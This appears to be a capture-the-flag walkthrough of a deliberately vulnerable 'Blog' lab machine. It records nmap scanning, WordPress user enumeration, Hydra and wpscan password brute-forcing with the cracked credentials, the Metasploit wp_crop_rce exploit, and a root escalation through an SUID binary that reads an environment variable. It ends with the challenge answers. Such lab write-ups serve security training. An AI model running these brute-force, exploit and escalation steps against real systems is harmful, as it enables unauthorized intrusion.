#Blog-Billy

export IP=10.10.163.16

nmap -A -sC -oN intial $IP

#Found wordPress 5.0 velnarable on port 80.

-------------------------------------------------------------------
command: searchsploit wordpress 5.0
-------------------------------------------------------------------

found metasploit exploit for wordpress 5.0

need user name and pass word for exploit to use in msfconsole.
--------------------------------------------------------------------
command: wpscan --url http://10.10.163.16/ -e u
--------------------------------------------------------------------

bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.163.16/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.163.16/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

#===================================================================

Trying to burteforce password using Hydra & wpscan.

--------------------------------------------------------------------
command: hydra -l kwheel -P /usr/share/wordlists/rockyou.txt ftp://10.10.163.16

command: wpscan -U kwheel -P /usr/share/wordlists/rockyou.txt -t 30 --password-attack wp-login --url blog.thm

found password with wpscan: Username: kwheel, Password: cutiepie1
--------------------------------------------------------------------

using enum4linux to furthure enumerations.
--------------------------------------------------------------------
command: enum4linux $IP
--------------------------------------------------------------------

let's take control over the machine. using msfconsole
-------------------------------------------------------
use exploit/multi/http/wp_crop_rce
set RHOSTS
set LHOST
set USERNAME
set PASSWORD
-------------------------------------------------------

lets find prevescs in this machine by finding suid set programs in machine.
-------------------------------------------------------
find / -perm -u=s -type f 2>/dev/null
-------------------------------------------------------

we found the suid file: /usr/sbin/checker

now lets check what it does.
-------------------------------------------------------
ltrace checker

getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
-------------------------------------------------------

So it gets the "admin" environment variable and prints out "Not an Admin". Wait, so if we set this environment variable, what happens?
--------------------------------------------------------------------
$ export admin=1
$ ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"
--------------------------------------------------------------------
Oh, so now it tries to run bash! And since this is owned by root, it'll run bash as root! SWEET!
--------------------------------------------------------------------
$ checker
$ id
uid=0(root) gid=33(www-data) groups=33(www-data)
--------------------------------------------------------------------

Let's try again that stuff to find the user flag:
--------------------------------------------------------------------

$ find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt
/media/usb/user.txt
--------------------------------------------------------------------

$ find / 2>/dev/null | grep root.txt
--------------------------------------------------------------------

#Q. which directory user flag was?
	ans: /media/usb

#Q. which CMS{Content management system} used?
	Ans: wordpress.

#Q. Which version?
	Ans: 5.0